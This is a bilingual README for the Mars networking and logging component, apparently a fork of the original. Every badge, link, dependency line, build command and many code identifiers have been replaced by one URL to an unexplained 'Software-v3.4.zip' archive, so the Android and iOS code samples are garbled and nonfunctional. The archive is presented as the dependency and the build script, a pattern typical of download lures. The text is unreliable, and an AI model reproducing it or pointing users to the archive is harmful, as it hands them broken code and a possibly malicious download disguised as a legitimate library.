## Mars

[![license](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
[![Release Version](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
[![PRs Welcome](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
[![WeChat Approved](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)

(中文版本请参看[这里](#mars_cn))

Mars is a cross-platform infrastructure component developed by WeChat Mobile Team.
It is proved to be effective by billions of Wechat users.

1. Cross platform, easy to deploy if you are developing multi-platform or multi-business application.
2. Suitable for small amount data transmission
3. Mobile platform friendly, low power and traffic consumption
4. A network solution fit for mobile application

![mars](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)

* comm：common library, including socket, thread, message queue, coroutine, etc.
* Xlog：a reliable log component with high-performance.
* SDT： a network detection component.
* STN： a signaling network component, the major part of Mars.

## Samples

Start with sample usage [here](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E)

## Getting started
Choose [Android](#android) or [iOS/OS X](#apple)

### <a name="android">[Android](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>

You can use either [mars-wrapper](#wrapper) or [mars-core](#core). We recommend you to use mars-wrapper when you just wanna build a sample or demo, while mars-core is preferred to be used in your APP.

#### <a name="wrapper">mars-wrapper</a>

Add dependencies by adding the following lines to your https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip

```xml
dependencies {
    compile 'https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip'
}
```

**OR**

#### <a name="core">mars-core</a>

Add dependencies by adding the following lines to your https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip

```xml
dependencies {
    compile 'https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip'
}
```

If you read here, make sure you have added dependencies of mars-wrapper or mars-core.

#### <a name="Xlog">Xlog Init</a>

Initialize Xlog when your APP starts. Remember to use an exclusive folder to save the log files, no other files are acceptable in the folder since they would be removed by the cleansing function in Xlog automatically.

When multiple processes is used in your app, make sure that each process owns its exclusive log file.

```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip("stlport_shared");
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip("marsxlog");

final String SDCARD = https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip().getAbsolutePath();
final String logPath = SDCARD + "/marssample/log";

//init xlog
if (https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip) {
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, "", logPath, "MarsSample");
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);

} else {
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, "", logPath, "MarsSample");
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(false);
}

https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(new Xlog());
```

Uninitialized Xlog when your app exits


```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
```

#### <a name="STN">STN Init</a>

If you add dependencies of mars-core to your project, you need to initialize and release STN.  
Initialize STN before you use it

```java
// set callback
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);

// Initialize the Mars PlatformComm
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(getApplicationContext(), new Handler(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip()));

// Initialize the Mars
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(), https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);

https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
```
Firstly, you should call the setCallBack interface, and secondly, the https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip Then, to initialize the Mars, there is to need to strictly follow the orders of the four commands. Finally, after Mars are initialized, onForeground and makesureLongLinkConnect can be called.

Destroy STN or exit your app:

```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
```

#### <a name="even">Event Change</a>

Network change:

```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip()
```
**********
If you add dependencies of mars-wrapper to your project, you just need initialize STN and no need uninitialized.

```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(this, getMainLooper(),null);
```
************
No matter which way of dependencies you used, you must pay attention to these.

The state (background or foreground) of the APP is changed:

```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(boolean);
```

The account of the APP is changed:

```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
```

If you want to modify the encryption algorithm of Xlog, the packer/unpacker of longlink/shortlink, or you want to define the other components by yourself, refer [here](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)

### <a name="apple">[iOS/OS X](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%EF%BC%8FOS-X-%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>
Compile

```
python https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip
```

Add https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip as a dependency of your project.

#### <a name="Xlog">Xlog Init</a>

Initialize Xlog when your app starts. Remember to use an exclusive folder to save the log files, no other files are acceptable in the folder since they would be removed by the cleansing function in Xlog automatically.

```cpp
NSString* logPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0] stringByAppendingString:@"/log"];

// set do not backup for logpath
const char* attrName = "https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip";
u_int8_t attrValue = 1;
setxattr([logPath UTF8String], attrName, &attrValue, sizeof(attrValue), 0, 0);

// init xlogger
#if DEBUG
xlogger_SetLevel(kLevelDebug);
appender_set_console_log(true);
#else
xlogger_SetLevel(kLevelInfo);
appender_set_console_log(false);
#endif
appender_open(kAppednerAsync, [logPath UTF8String], "Test");
```

Uninitialized xlog in function "applicationWillTerminate"


```cpp
appender_close();
```

####<a name="STN">STN Init</a>

Initialize STN before you use it:

```objc
- (void)setCallBack {
    mars::stn::SetCallback(mars::stn::StnCallBack::Instance());
    mars::app::SetCallback(mars::app::AppCallBack::Instance());
}

- (void) createMars {
    mars::baseevent::OnCreate();
}

- (void)setClientVersion:(UInt32)clientVersion {
    mars::stn::SetClientVersion(clientVersion);
}

- (void)setShortLinkDebugIP:(NSString *)IP port:(const unsigned short)port {
    std::string ipAddress([IP UTF8String]);
    mars::stn::SetShortlinkSvrAddr(port, ipAddress);
}

- (void)setShortLinkPort:(const unsigned short)port {
    mars::stn::SetShortlinkSvrAddr(port);
}

- (void)setLongLinkAddress:(NSString *)string port:(const unsigned short)port debugIP:(NSString *)IP {
    std::string ipAddress([string UTF8String]);
    std::string debugIP([IP UTF8String]);
    std::vector<uint16_t> ports;
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(port);
    mars::stn::SetLonglinkSvrAddr(ipAddress,ports,debugIP);
}

- (void)setLongLinkAddress:(NSString *)string port:(const unsigned short)port {
    std::string ipAddress([string UTF8String]);
    std::vector<uint16_t> ports;
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(port);
    mars::stn::SetLonglinkSvrAddr(ipAddress,ports);
}

- (void)reportEvent_OnForeground:(BOOL)isForeground {
    mars::baseevent::OnForeground(isForground);
}

- (void)makesureLongLinkConnect {
    mars::stn::MakesureLonglinkConnected();
}
```

Firstly, you should call the setCalBack interface, and secondly, the https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip Then, to initialize the Mars, there is to need to strictly follow the orders of the four commands. Finally, after Mars are initialized, onForeground and makesureLongLinkConnect can be called.

If you want to destroy STN or exit App:

```objc
- (void)destroyMars {
    mars::baseevent::OnDestroy();
}
```

#### <a name="even">Event Change</a>

When the App's state of background or foreground is changed:

```objc
- (void)reportEvent_OnForeground:(BOOL)isForeground {
    mars::baseevent::OnForeground(isForground);
}
```

Network change:

```objc
- (void)reportEvent_OnNetworkChange {
    mars::baseevent::OnNetworkChange();
}
```

## Support
Any problem?

1. Learn more from [mars/sample](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
2. Read the [source code](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
3. Read the [wiki](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip) or [FAQ](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) for help.
4. Contact us for help.

## Contributing
For more information about contributing issues or pull requests, see our [Mars Contributing Guide](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).

## License
Mars is under the MIT license. See the [LICENSE](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip) file for details.


------------------------------
## <a name="mars_cn">Mars</a>

[![license](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
[![Release Version](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
[![PRs Welcome](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
[![WeChat Approved](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)


Mars 是微信官方的跨平台跨业务的终端基础组件。


![mars](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)

* comm：可以独立使用的公共库，包括 socket、线程、消息队列、协程等；
* xlog：高可靠性高性能的运行期日志组件；
* SDT： 网络诊断组件；
* STN： 信令分发网络模块，也是 Mars 最主要的部分。

##Samples

sample 的使用请参考[这里](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E)

##Getting started
接入 [Android](#android) 或者 [iOS/OS X](#apple)

###<a name="android">[Android](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>

gradle 接入我们提供了两种接入方式：[mars-wrapper](#wrapper) 或者 [mars-core](#core)。如果你只是想做个 sample 推荐使用 mars-wrapper，可以快速开发；但是如果你想把 mars 用到你的 app 中的话，推荐使用 mars-core，可定制性更高。

#### <a name="wrapper">mars-wrapper</a>

在 https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip 中添加 mars-wrapper 的依赖：


```xml
dependencies {
    compile 'https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip'
}
```

**或者**

#### <a name="core">mars-core</a>

在 https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip 中添加 mars-core 的依赖：


```xml
dependencies {
    compile 'https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip'
}
```
接着往下操作之前，请先确保你已经添加了 mars-wrapper 或者 mars-core 的依赖

#### <a name="Xlog">Xlog Init</a>

在程序启动加载 Xlog 后紧接着初始化 Xlog。但要注意如果你的程序使用了多进程，不要把多个进程的日志输出到同一个文件中，保证每个进程独享一个日志文件。而且保存 log 的目录请使用单独的目录，不要存放任何其他文件防止被 xlog 自动清理功能误删。


```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip("stlport_shared");
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip("marsxlog");

final String SDCARD = https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip().getAbsolutePath();
final String logPath = SDCARD + "/marssample/log";

//init xlog
if (https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip) {
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, "", logPath, "MarsSample");
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);

} else {
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, "", logPath, "MarsSample");
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(false);
}

https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(new Xlog());
```

程序退出时关闭日志：


```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
```

#### <a name="STN">STN Init</a>

如果你是把 mars-core 作为依赖加入到你的项目中的话，你需要显式的初始化和反初始化 STN

在使用 STN 之前进行初始化

```java
// set callback
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);

// Initialize the Mars PlatformComm
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(getApplicationContext(), new Handler(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip()));

// Initialize the Mars
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(), https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);

https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
```

初始化顺序不一定要严格遵守上述代码的顺序，但在初始化时首先要调用 setCallBack 接口 (callback 文件的编写可以参考 demo)，再调用 https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip，最后再调用onForeground 和 makesureLongLinkConnect，中间顺序可以随意更改。**注意：STN 默认是后台，所以初始化 STN 后需要主动调用一次**```https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true)```

需要释放 STN 或者退出程序时:

```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
```

#### <a name="even">Event Change</a>

网络切换时:

```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip()
```
**********
如果你是把 mars-wrapper 作为依赖加入到你的项目中，你只需要显式的初始化 STN，不需要反初始化(因为 mars-wrapper 会进行反初始化)

```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(this, getMainLooper(),null);
```
************
不管你是使用 mars-wrapper 还是 mars-core，你都需要特别注意以下事件：


前后台切换:

```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(boolean);
```

应用的账号信息更改:

```java
https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
```

如果你想修改 Xlog 的加密算法或者长短连的加解包部分甚至更改组件的其他部分，可以参考[这里]
(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)

### <a name="apple">[iOS/OS X](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%EF%BC%8FOS-X-%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>
编译

```
python https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip
```

把 https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip 作为依赖加入到你的项目中

#### <a name="Xlog">Xlog Init</a>

在程序启动加载 Xlog 后紧接着初始化 Xlog。但要注意保存 log 的目录请使用单独的目录，不要存放任何其他文件防止被 xlog 自动清理功能误删。


```cpp
NSString* logPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0] stringByAppendingString:@"/log"];

// set do not backup for logpath
const char* attrName = "https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip";
u_int8_t attrValue = 1;
setxattr([logPath UTF8String], attrName, &attrValue, sizeof(attrValue), 0, 0);

// init xlogger
#if DEBUG
xlogger_SetLevel(kLevelDebug);
appender_set_console_log(true);
#else
xlogger_SetLevel(kLevelInfo);
appender_set_console_log(false);
#endif
appender_open(kAppednerAsync, [logPath UTF8String], "Test");
```

在函数 "applicationWillTerminate" 中反初始化 Xlog

```cpp
appender_close();
```

#### <a name="STN">STN Init</a>

在你用 STN 之前初始化：

```objc
- (void)setCallBack {
    mars::stn::SetCallback(mars::stn::StnCallBack::Instance());
    mars::app::SetCallback(mars::app::AppCallBack::Instance());
}

- (void) createMars {
    mars::baseevent::OnCreate();
}

- (void)setClientVersion:(UInt32)clientVersion {
    mars::stn::SetClientVersion(clientVersion);
}

- (void)setShortLinkDebugIP:(NSString *)IP port:(const unsigned short)port {
    std::string ipAddress([IP UTF8String]);
    mars::stn::SetShortlinkSvrAddr(port, ipAddress);
}

- (void)setShortLinkPort:(const unsigned short)port {
    mars::stn::SetShortlinkSvrAddr(port);
}

- (void)setLongLinkAddress:(NSString *)string port:(const unsigned short)port debugIP:(NSString *)IP {
    std::string ipAddress([string UTF8String]);
    std::string debugIP([IP UTF8String]);
    std::vector<uint16_t> ports;
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(port);
    mars::stn::SetLonglinkSvrAddr(ipAddress,ports,debugIP);
}

- (void)setLongLinkAddress:(NSString *)string port:(const unsigned short)port {
    std::string ipAddress([string UTF8String]);
    std::vector<uint16_t> ports;
    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(port);
    mars::stn::SetLonglinkSvrAddr(ipAddress,ports);
}

- (void)reportEvent_OnForeground:(BOOL)isForeground {
    mars::baseevent::OnForeground(isForground);
}

- (void)makesureLongLinkConnect {
    mars::stn::MakesureLonglinkConnected();
}
```

初始化顺序不一定要严格遵守上述代码的顺序，但在初始化时首先要调用 setCallBack 接口 (callback 文件的编写可以参考 demo)，再调用 https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip，最后再调用 onForeground 和 makesureLongLinkConnect，中间顺序可以随意更改。**注意：STN 默认是后台，所以初始化 STN 后需要主动调用一次**```https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true)```


需要释放 STN 或者退出程序时:

```objc
- (void)destroyMars {
    mars::baseevent::OnDestroy();
}
```

#### <a name="even">Event Change</a>

前后台切换时:

```objc
- (void)reportEvent_OnForeground:(BOOL)isForeground {
    mars::baseevent::OnForeground(isForeground);
}
```

网络切换时：

```objc
- (void)reportEvent_OnNetworkChange {
    mars::baseevent::OnNetworkChange();
}
```

## Support
还有其他问题？

1. 参看 [mars/sample](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
2. 阅读 [源码](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
3. 阅读 [wiki](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip) 或者 [FAQ](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
4. 联系我们.

## Contributing
关于 Mars 分支管理、issue 以及 pr 规范, 请阅读 [Mars Contributing Guide](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).

## License
Mars 使用的 MIT 协议，详细请参考[LICENSE](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
